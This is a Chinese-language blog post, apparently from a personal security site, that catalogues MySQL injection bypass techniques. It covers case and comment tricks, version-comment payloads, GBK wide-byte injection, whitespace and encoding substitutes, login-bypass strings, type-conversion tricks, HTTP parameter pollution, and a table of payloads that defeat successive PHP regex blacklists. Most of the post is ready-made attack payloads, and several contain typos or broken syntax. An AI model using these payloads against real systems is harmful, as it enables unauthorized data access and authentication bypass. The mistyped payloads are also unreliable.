<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">



  
  
    
    
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">







<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png?v=">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png?v=">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png?v=">


  <link rel="mask-icon" href="/images/favicon.png?v=" color="#222">





  <meta name="keywords" content="Mysql," />










<meta name="description" content="绕过单引号   语句 解释     SELECT FROM Users WHERE username = 0x61646D696E HEX编码   SELECT FROM Users WHERE username = CHAR(97, 100, 109, 105, 110) CHAR()函数    大小写绕过?id=1+UnIoN+SeLecT+1,2,3-- 替换绕过?id=1+UNunionI">
<meta name="keywords" content="Mysql">
<meta property="og:type" content="article">
<meta property="og:title" content="MySql注入-各种绕过姿势">
<meta property="og:url" content="https://kidhat.github.io/2017/11/07/MySql注入-各种绕过姿势/index.html">
<meta property="og:site_name" content="KidHat">
<meta property="og:description" content="绕过单引号   语句 解释     SELECT FROM Users WHERE username = 0x61646D696E HEX编码   SELECT FROM Users WHERE username = CHAR(97, 100, 109, 105, 110) CHAR()函数    大小写绕过?id=1+UnIoN+SeLecT+1,2,3-- 替换绕过?id=1+UNunionI">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://kidhat.github.io/2017/11/07/MySql注入-各种绕过姿势/类型转换.png">
<meta property="og:updated_time" content="2017-11-07T03:38:44.441Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="MySql注入-各种绕过姿势">
<meta name="twitter:description" content="绕过单引号   语句 解释     SELECT FROM Users WHERE username = 0x61646D696E HEX编码   SELECT FROM Users WHERE username = CHAR(97, 100, 109, 105, 110) CHAR()函数    大小写绕过?id=1+UnIoN+SeLecT+1,2,3-- 替换绕过?id=1+UNunionI">
<meta name="twitter:image" content="https://kidhat.github.io/2017/11/07/MySql注入-各种绕过姿势/类型转换.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://kidhat.github.io/2017/11/07/MySql注入-各种绕过姿势/"/>





  <title>MySql注入-各种绕过姿势 | KidHat</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">KidHat</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">在不断尝试活出更好的自己</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://kidhat.github.io/2017/11/07/MySql注入-各种绕过姿势/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="KidHat">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="KidHat">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">MySql注入-各种绕过姿势</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-07T10:03:53+08:00">
                2017-11-07
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Web-Security/" itemprop="url" rel="index">
                    <span itemprop="name">Web-Security</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="绕过单引号"><a href="#绕过单引号" class="headerlink" title="绕过单引号"></a>绕过单引号</h1><table>
<thead>
<tr>
<th><strong>语句</strong></th>
<th><strong>解释</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>SELECT <em>FROM Users WHERE username = 0x61646D696E</em></td>
<td>HEX编码</td>
</tr>
<tr>
<td>SELECT FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)</td>
<td>CHAR()函数</td>
</tr>
</tbody>
</table>
<h1 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h1><p><code>?id=1+UnIoN+SeLecT+1,2,3--</code></p>
<h1 id="替换绕过"><a href="#替换绕过" class="headerlink" title="替换绕过"></a>替换绕过</h1><p><code>?id=1+UNunionION+SEselectLECT+1,2,3--</code></p>
<h1 id="注释绕过"><a href="#注释绕过" class="headerlink" title="注释绕过"></a>注释绕过</h1><p><code>?id=1+un/**/ion+se/**/lect+1,2,3--</code></p>
<h1 id="特殊嵌入绕过"><a href="#特殊嵌入绕过" class="headerlink" title="特殊嵌入绕过"></a>特殊嵌入绕过</h1><p><code>?id=1/*!UnIoN*/SeLecT+1,2,3--</code></p>
<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>SQL注入中的宽字节国内最常使用的gbk编码，这种方式主要是绕过addslashes等对特殊字符进行转移的绕过。反斜杠()的十六进制为%5c，在你输入<code>%bf%27</code>时，函数遇到单引号自动转移加入\，此时变为%bf%5c%27，%bf%5c在gbk中变为一个宽字符”縗”。%bf那个位置可以是%81-%fe中间的任何字符。不止在sql注入中，宽字符注入在很多地方都可以应用。</p>
<h1 id="MySQL版本号字符"><a href="#MySQL版本号字符" class="headerlink" title="MySQL版本号字符"></a>MySQL版本号字符</h1><p>Examples:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">UNION SELECT /*!50000 5,null;%00*//*!40000 4,null-- ,*//*!30000 3,null-- x*/0,null--+</div><div class="line">SELECT 1/*!41320UNION/*!/*!/*!00000SELECT/*!/*!USER/*!(/*!/*!/*!*/);</div></pre></td></tr></table></figure></p>
<ul>
<li>这样的查询语句是可以执行的，我理解为类似Python中第一行注释指定解析器一样#!/bin/sh</li>
<li>对于小于或等于版本号的语句就会执行</li>
<li>例如目前的Mysql版本为5.7.17那么/<em>!50717</em>/及其以下的语句即可执行</li>
</ul>
<h1 id="字符编码绕过"><a href="#字符编码绕过" class="headerlink" title="字符编码绕过"></a>字符编码绕过</h1><p>前端时间看到ph师傅的博客是讨论mysql字符编码的文章，大概意思如下，原文在 <a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="external">这里</a><br>当出现有以下代码时，指设置了字符编码为utf-8，但并不是全部为utf-8，而在具体的转换过程中会出现意外的情况，具体可以看ph师傅的文章</p>
<p><code>$mysqli-&gt;query(&quot;set names utf8&quot;);</code></p>
<p>在sql查询中</p>
<p>test.php?username=admin%e4中的%e4会被admin忽略掉而绕过了一些逻辑，还有一些类似于$e4这样的字符如%c2等</p>
<h1 id="绕空格"><a href="#绕空格" class="headerlink" title="绕空格"></a>绕空格</h1><h2 id="特殊字符绕过空格"><a href="#特殊字符绕过空格" class="headerlink" title="特殊字符绕过空格"></a>特殊字符绕过空格</h2><table>
<thead>
<tr>
<th><strong>字符</strong></th>
<th><strong>解释</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>09</td>
<td>Horizontal Tab</td>
</tr>
<tr>
<td>0A</td>
<td>New Line</td>
</tr>
<tr>
<td>0B</td>
<td>Vertical Tab</td>
</tr>
<tr>
<td>0C</td>
<td>New Page</td>
</tr>
<tr>
<td>0D</td>
<td>Carriage Return</td>
</tr>
<tr>
<td>A0</td>
<td>Non-breaking Space</td>
</tr>
<tr>
<td>20</td>
<td>Space</td>
</tr>
</tbody>
</table>
<p>Example:</p><p></p>
<p><code>&lt;p&gt;&#39;%0AUNION%0CSELECT%A0NULL%20%23</code></p>
<h2 id="括号绕过空格"><a href="#括号绕过空格" class="headerlink" title="括号绕过空格"></a>括号绕过空格</h2><table>
<thead>
<tr>
<th><strong>字符</strong></th>
<th><strong>解释</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>28</td>
<td>(</td>
</tr>
<tr>
<td>29</td>
<td>)</td>
</tr>
</tbody>
</table>
<p>Example:</p><p></p>
<p><code>&lt;/p&gt;UNION(SELECT(column)FROM(table))</code></p>
<h2 id="and-or后插入字符绕过空格"><a href="#and-or后插入字符绕过空格" class="headerlink" title="and/or后插入字符绕过空格"></a>and/or后插入字符绕过空格</h2><p>任意混合+ - ~ !可以达到绕过空格的效果（可以现在本地测试，混合后需要的奇偶数可能不同）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SELECTDISTINCT(db) FROM mysql.db WHERE`Host`=&quot;localhost&amp;amp&quot; and-++-1=1;需要偶数个--</div><div class="line">SELECTDISTINCT(db) FROM mysql.db WHERE`Host`=&quot;localhost&amp;amp&quot; and!! ~~~~!1=1;需要奇数个！</div></pre></td></tr></table></figure></p>
<p>其实一下的字符都可以测试</p>
<table>
<thead>
<tr>
<th><strong>字符</strong></th>
<th><strong>释意</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>20</td>
<td>Space</td>
</tr>
<tr>
<td>2B</td>
<td>+</td>
</tr>
<tr>
<td>2D</td>
<td>–</td>
</tr>
<tr>
<td>7E</td>
<td>~</td>
</tr>
<tr>
<td>21</td>
<td>!</td>
</tr>
<tr>
<td>40</td>
<td>@</td>
</tr>
</tbody>
</table>
<h2 id="注释符-amp-引号"><a href="#注释符-amp-引号" class="headerlink" title="注释符&amp;引号"></a>注释符&amp;引号</h2><p>SELECTDISTINCT(db) FROM mysql.db WHERE<code>Host</code>=”localhost” and/**/1=1;<br>SELECT DISTINCT(db) FROM mysql.db WHERE <code>Host</code>=&#39;localhost&#39; and&quot;1=1&quot;;</p>
<h1 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h1><table>
<thead>
<tr>
<th><strong>COLUMN</strong></th>
<th><strong>COLUMN</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>URL Encoding</td>
<td>SELECT %74able%6eame FROM information_schema.tables;</td>
</tr>
<tr>
<td>Double URL Encoding</td>
<td>SELECT %2574able%256eame FROM information_schema.tables;</td>
</tr>
<tr>
<td>Unicode Encoding</td>
<td>SELECT %u0074able%u6eame FROM information_schema.tables;</td>
</tr>
</tbody>
</table>
<h1 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a>关键字绕过</h1><p>测试用例information_schema.tables</p>
<table>
<thead>
<tr>
<th><strong>COLUMN</strong></th>
<th><strong>COLUMN</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>空格</td>
<td>Information<em>schema . tables</em></td>
</tr>
<tr>
<td>反引号</td>
<td>informationschema.tables</td>
</tr>
<tr>
<td>特殊符</td>
<td>/!Information_schema.tables/</td>
</tr>
<tr>
<td>别名</td>
<td>Information_schema.partitions,statistics,key<em>column</em> usage,table_constraints</td>
</tr>
</tbody>
</table>
<h1 id="认证绕过"><a href="#认证绕过" class="headerlink" title="认证绕过"></a>认证绕过</h1><h2 id="绕过语句：’-’"><a href="#绕过语句：’-’" class="headerlink" title="绕过语句：’=’"></a>绕过语句：’=’</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">select data from users where name=&quot;=&quot;</div><div class="line">select data from users where flase=&quot;</div><div class="line">select data from users where 0=0</div></pre></td></tr></table></figure>
<h2 id="绕过语句：-39-39"><a href="#绕过语句：-39-39" class="headerlink" title="绕过语句：&#39;-&#39;"></a>绕过语句：&#39;-&#39;</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">select data from users where name=&apos;&apos;-&apos;&apos;</div><div class="line">select data from users where name=0-0</div><div class="line">select data from users where 0=0</div></pre></td></tr></table></figure>
<p>比如登录的时候需要输入email和passwd，可以这样输入</p>
<p>email=&#39;&#39;&amp;password=&#39;&#39;</p>
<h1 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&apos; or 1=true</div><div class="line">&apos; or 1</div><div class="line">select * from users where &apos;a&apos;=&apos;b&apos;=&apos;c&apos;</div><div class="line">select * from users where (&apos;a&apos;=&apos;b&apos;)=&apos;c&apos;</div><div class="line">select * from users where (false)=&apos;c&apos;</div><div class="line">select * from users where (0)=&apos;c&apos;</div><div class="line">select * from users where (0)=0</div><div class="line">select * from users where trueselect * from users</div></pre></td></tr></table></figure>
<p> <img src="/2017/11/07/MySql注入-各种绕过姿势/类型转换.png" alt=""></p>
<p>当把字符串转为数字的时候，其实是从左边开始处理的。</p>
<ul>
<li>如果字符串的第一个字符就是非数字的字符，那么转换为数字就是0</li>
<li>如果字符串以数字开头</li>
<li>如果字符串中都是数字，那么转换为数字就是整个字符串对应的数字</li>
<li>如果字符串中存在非数字，那么转换为的数字就是开头的那些数字对应的值</li>
</ul>
<p>mysql&gt; select&#39;a&#39; + &#39;b&#39;;<br>+———–+<br>| &#39;a&#39; + &#39;b&#39; |<br>+———–+<br>| 0 |<br>+———–+<br>1rowinset, 2warnings (0.00 sec)<br>除了＋号，其他算术操作符号也会发生类型的类型转换<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&apos;a&apos;MOD&apos;1&apos;对应的数值为0 MOD 1 ＝0</div><div class="line">&apos; -&quot;对应的数值为0 -0 ＝0</div><div class="line">&apos; /&apos;1&apos;对应的数值为0 /1 ＝0</div><div class="line">a&apos;&amp;&apos;b&apos;对应的数值为0&amp;0 ＝0</div></pre></td></tr></table></figure></p>
<p>｜，^，&lt;&lt; ，&gt;&gt;也有同样的效果或者能做到类型转换的函数，如CAST()、CONCA()等<br>关于隐式类型转换的文章可以看 <a href="http://www.freebuf.com/articles/web/8773.html" target="_blank" rel="external">这里</a></p>
<table>
<thead>
<tr>
<th>优先级</th>
<th>运算符</th>
</tr>
</thead>
<tbody>
<tr>
<td>(最高)</td>
<td>!</td>
</tr>
<tr>
<td></td>
<td>-（负号）,~（按位取反）</td>
</tr>
<tr>
<td></td>
<td>^（按位异或）</td>
</tr>
<tr>
<td></td>
<td>*,/(DIV),%(MOD)</td>
</tr>
<tr>
<td></td>
<td>+,-</td>
</tr>
<tr>
<td></td>
<td>&gt;&gt;,&lt;&lt;</td>
</tr>
<tr>
<td></td>
<td>&amp;</td>
</tr>
<tr>
<td></td>
<td>&#x7C;</td>
</tr>
<tr>
<td></td>
<td>=(比较运算),&lt;=&gt;,&lt;,&lt;=,&gt;,&gt;=,!=,&lt;&gt;,IN,IS NULL,LIKE,REGEXP</td>
</tr>
<tr>
<td></td>
<td>BETWEEN AND,CASE,WHEN,THEN,ELSE</td>
</tr>
<tr>
<td></td>
<td>NOT</td>
</tr>
<tr>
<td></td>
<td>&amp;&amp;,AND</td>
</tr>
<tr>
<td></td>
<td>XOR</td>
</tr>
<tr>
<td></td>
<td>&#x7C;&#x7C;,OR</td>
</tr>
<tr>
<td>(最低)</td>
<td>=(赋值运算),:=</td>
</tr>
</tbody>
</table>
<h1 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h1><p>当我们传入的参数为</p>
<p><a href="http://sqlinjection.com/?par1=val1&amp;par1=val2" target="_blank" rel="external">http://sqlinjection.com/?par1=val1&amp;par1=val2</a></p>
<p>进入到不同的Web Server就可能得到不同的结果，这里借鉴一下国外大佬一篇文章的总结，如下：</p>
<table>
<thead>
<tr>
<th><strong>WEB SERVER</strong></th>
<th><strong>PARAMETER INTERPRETATION</strong></th>
<th><strong>EXAMPLE</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>ASP.NET/IIS</td>
<td>Concatenation by comma</td>
<td>par1=val1,val2</td>
</tr>
<tr>
<td>ASP/IIS</td>
<td>Concatenation by comma</td>
<td>par1=val1,val2</td>
</tr>
<tr>
<td>PHP/Apache</td>
<td>The last param is resulting</td>
<td>par1=val2</td>
</tr>
<tr>
<td>JSP/Tomcat</td>
<td>The first param is resulting</td>
<td>par1=val1</td>
</tr>
<tr>
<td>Perl/Apache</td>
<td>The first param is resulting</td>
<td>par1=val1</td>
</tr>
<tr>
<td>DBMan</td>
<td>Concatenation by two tildes</td>
<td>par1=val1~~val2</td>
</tr>
</tbody>
</table>
<p>不同的web server的处理结果截然不同</p>
<table>
<thead>
<tr>
<th><strong>QUERY STRING</strong></th>
<th><strong>APACHE/2.2.16, PHP/5.3.3</strong></th>
<th><strong>IIS6/ASP</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>?test[1=2</td>
<td>test_1=2</td>
<td>test[1=2</td>
</tr>
<tr>
<td>?test=%</td>
<td>test=%</td>
<td>test=</td>
</tr>
<tr>
<td>?test%00=1</td>
<td>test=1</td>
<td>test=1</td>
</tr>
<tr>
<td>?test=1%001</td>
<td>NULL</td>
<td>test=1</td>
</tr>
<tr>
<td>?test+d=1+2</td>
<td>test_d=1 2</td>
<td>test d=1 2</td>
</tr>
</tbody>
</table>
<p>这里也推荐一篇国外的 <a href="http://www.blackhat.com/presentations/bh-usa-09/DZULFAKAR/BHUSA09-Dzulfakar-MySQLExploit-SLIDES.pdf" target="_blank" rel="external">文章</a></p>
<h1 id="实战正则过滤绕过"><a href="#实战正则过滤绕过" class="headerlink" title="实战正则过滤绕过"></a>实战正则过滤绕过</h1><table>
<thead>
<tr>
<th><strong>过滤字符</strong></th>
<th><strong>PHP正则代码</strong></th>
<th><strong>原查询语句</strong></th>
<th><strong>现查询语句</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>and, or</td>
<td>preg_match(&#39;/(and&#x7C;or)/i&#39;, $id)</td>
<td>1 or 1 = 1,1 and 1 = 1</td>
<td>1 &#x7C;&#x7C; 1 = 1, 1 &amp;&amp; 1 = 1</td>
</tr>
<tr>
<td>and, or, union</td>
<td>preg_match(&#39;/(and&#x7C;or&#x7C;<br>union)/i&#39;, $id)</td>
<td>union select user, password from users</td>
<td>1 &#x7C;&#x7C; (select user from users where user_id = 1) = &#39;admin&#39;</td>
</tr>
<tr>
<td>and, or, union, where</td>
<td>preg_match(‘/(and&#x7C;or&#x7C;<br>union&#x7C;where)/i&#39;, $id)</td>
<td>1 &#x7C;&#x7C; (select user from users where user_id = 1) = &#39;admin&#39;</td>
<td>1 &#x7C;&#x7C; (select user from users limit 1) = &#39;admin&#39;</td>
</tr>
<tr>
<td>and, or, union, where, limit</td>
<td>preg_match(‘/(and&#x7C;or&#x7C;<br>union&#x7C;where&#x7C;limit)/i&#39;, $id)</td>
<td>1 &#x7C;&#x7C; (select user from users limit 1) = &#39;admin&#39;</td>
<td>1 &#x7C;&#x7C; (select user from users group by user_id having user_id = 1) = &#39;admin&#39;</td>
</tr>
<tr>
<td>and, or, union, where, limit, group by</td>
<td>preg_match(&#39;/(and&#x7C;or&#x7C;<br>union&#x7C;where&#x7C;limit&#x7C;group by)/i&#39;, $id)</td>
<td>1 &#x7C;&#x7C; (select user from users group by user_id having user_id = 1) = &#39;admin&#39;</td>
<td>1 &#x7C;&#x7C; (select substr(gruop_concat(user_id),1,1) user from users ) = 1</td>
</tr>
<tr>
<td>and, or, union, where, limit, group by, select</td>
<td>preg_match(&#39;/(and&#x7C;or&#x7C;<br>union&#x7C;where&#x7C;limit&#x7C;group by&#x7C;select)/i&#39;, $id)</td>
<td>1 &#x7C;&#x7C; (select substr(gruop_concat<br>(user_id),1,1) user from users) = 1</td>
<td>1 &#x7C;&#x7C; 1 = 1 into outfile &#39;result.txt&#39;<br>1 &#x7C;&#x7C; substr(user,1,1) = &#39;a&#39;</td>
</tr>
<tr>
<td>and, or, union, where, limit, group by, select, &#39;</td>
<td>preg_match(&#39;/(and&#x7C;or&#x7C;<br>union&#x7C;where&#x7C;limit&#x7C;group by&#x7C;select&#x7C;\&#39;)/i&#39;, $id)</td>
<td>1 &#x7C;&#x7C; (select substr(gruop_concat<br>(user_id),1,1) user from users) = 1</td>
<td>1 &#x7C;&#x7C; user_id is not null<br>1 &#x7C;&#x7C; substr(user,1,1) = 0x61<br>1 &#x7C;&#x7C; substr(user,1,1) = unhex(61)</td>
</tr>
<tr>
<td>and, or, union, where, limit, group by, select, &#39;, hex</td>
<td>preg_match(&#39;/(and&#x7C;or&#x7C;<br>union&#x7C;where&#x7C;limit&#x7C;group by&#x7C;select&#x7C;\&#39;&#x7C;hex)/i&#39;, $id)</td>
<td>1 &#x7C;&#x7C; substr(user,1,1) = unhex(61)</td>
<td>1 &#x7C;&#x7C; substr(user,1,1) = lower(conv(11,&#x7C;0,36))</td>
</tr>
<tr>
<td>and, or, union, where, limit, group by, select, &#39;, hex, substr</td>
<td>preg_match(&#39;/(and&#x7C;or&#x7C;<br>union&#x7C;where&#x7C;limit&#x7C;group by&#x7C;select&#x7C;\&#39;&#x7C;hex&#x7C;substr)/i&#39;, $id)</td>
<td>1 &#x7C;&#x7C; substr(user,1,1) = lower(conv(11,10,36))</td>
<td>1 &#x7C;&#x7C; lpad(user,7,1)</td>
</tr>
<tr>
<td>and, or, union, where, limit, group by, select, &#39;, hex, substr, white space</td>
<td>preg_match(&#39;/(and&#x7C;or&#x7C;union<br>&#x7C;where&#x7C;limit&#x7C;group by&#x7C;select&#x7C;\&#39;&#x7C;hex&#x7C;substr&#x7C;\s)/i&#39;, $id)</td>
<td>1 &#x7C;&#x7C; lpad(user,7,1)</td>
<td>1%0b&#x7C;&#x7C;%0blpad(user,7,1)</td>
</tr>
</tbody>
</table>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Mysql/" rel="tag"># Mysql</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2017/11/04/MySql注入-基础/" rel="next" title="MySql注入(基础)">
                <i class="fa fa-chevron-left"></i> MySql注入(基础)
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/avatar.gif"
                alt="KidHat" />
            
              <p class="site-author-name" itemprop="name">KidHat</p>
              <p class="site-description motion-element" itemprop="description">冷冷雨喔呃喔...</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">3</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">1</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          <div class="links-of-author motion-element">
            
              
                <span class="links-of-author-item">
                  <a href="https://github.com/KidHat" target="_blank" title="GitHub">
                    
                      <i class="fa fa-fw fa-github"></i>GitHub</a>
                </span>
              
            
          </div>

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#绕过单引号"><span class="nav-number">1.</span> <span class="nav-text">绕过单引号</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#大小写绕过"><span class="nav-number">2.</span> <span class="nav-text">大小写绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#替换绕过"><span class="nav-number">3.</span> <span class="nav-text">替换绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#注释绕过"><span class="nav-number">4.</span> <span class="nav-text">注释绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#特殊嵌入绕过"><span class="nav-number">5.</span> <span class="nav-text">特殊嵌入绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#宽字节注入"><span class="nav-number">6.</span> <span class="nav-text">宽字节注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MySQL版本号字符"><span class="nav-number">7.</span> <span class="nav-text">MySQL版本号字符</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#字符编码绕过"><span class="nav-number">8.</span> <span class="nav-text">字符编码绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#绕空格"><span class="nav-number">9.</span> <span class="nav-text">绕空格</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#特殊字符绕过空格"><span class="nav-number">9.1.</span> <span class="nav-text">特殊字符绕过空格</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#括号绕过空格"><span class="nav-number">9.2.</span> <span class="nav-text">括号绕过空格</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#and-or后插入字符绕过空格"><span class="nav-number">9.3.</span> <span class="nav-text">and/or后插入字符绕过空格</span></a></li><li class="nav-item nav-level-2"><a 